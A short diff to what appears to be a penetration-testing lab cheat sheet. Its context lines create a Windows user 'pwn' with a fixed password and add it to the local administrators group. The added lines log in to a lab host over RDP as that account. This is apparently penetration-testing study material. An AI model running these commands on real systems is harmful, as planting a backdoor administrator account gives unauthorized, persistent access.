@@ -12,6 +12,10 @@ net localgroup administrators pwn /add
 net user pwn ThisIsOneUsersPass01 /add /y 
 ```
 
+```bash
+rdesktop -g 80% -u pwn -p ThisIsOneUsersPass01 10.11.1.x
+```
+
 ## Linux
 
 ```bash
